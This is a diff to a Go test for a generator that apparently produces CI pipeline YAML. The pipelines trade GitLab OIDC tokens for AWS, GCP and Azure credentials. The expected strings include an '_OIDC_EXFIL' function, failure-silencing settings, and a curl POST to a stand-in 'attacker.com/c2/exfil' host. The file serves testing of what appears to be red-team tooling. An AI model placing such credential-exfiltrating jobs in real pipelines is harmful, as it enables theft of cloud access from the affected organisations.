@@ -21,14 +21,16 @@ func TestGenerateOIDCFederationYAML(t *testing.T) {
 				"aud: sts.amazonaws.com",
 				"_OIDC_EXFIL()",
 				"AssumeRoleWithWebIdentity",
-				"aws_credentials.json",
+				"AWS_STS_RESPONSE",
+				".oidc-federation-result.json",
 				"_OIDC_EXFIL || true",
 				"allow_failure: true",
+				"artifacts:",
+				"perl",
 			},
 			absent: []string{
 				"googleapis",
 				"microsoftonline",
-				"curl -sS -X POST -F",
 			},
 		},
 		{
@@ -40,7 +42,7 @@ func TestGenerateOIDCFederationYAML(t *testing.T) {
 			contains: []string{
 				"aud: https://iam.googleapis.com",
 				"sts.googleapis.com/v1/token",
-				"gcp_sts_token.json",
+				"GCP_STS_RESPONSE",
 				"projects/123/locations/global/workloadIdentityPools/pool/providers/gitlab",
 			},
 			absent: []string{
@@ -57,7 +59,7 @@ func TestGenerateOIDCFederationYAML(t *testing.T) {
 			contains: []string{
 				"aud: api://AzureADTokenExchange",
 				"login.microsoftonline.com/my-tenant-id",
-				"azure_token.json",
+				"AZURE_AD_RESPONSE",
 				"jwt-bearer",
 			},
 			absent: []string{
@@ -87,7 +89,7 @@ func TestGenerateOIDCFederationYAML(t *testing.T) {
 			contains: []string{
 				"curl -sS -X POST -F",
 				"https://attacker.com/c2/exfil",
-				`provider=aws`,
+				"provider=aws",
 			},
 		},
 	}
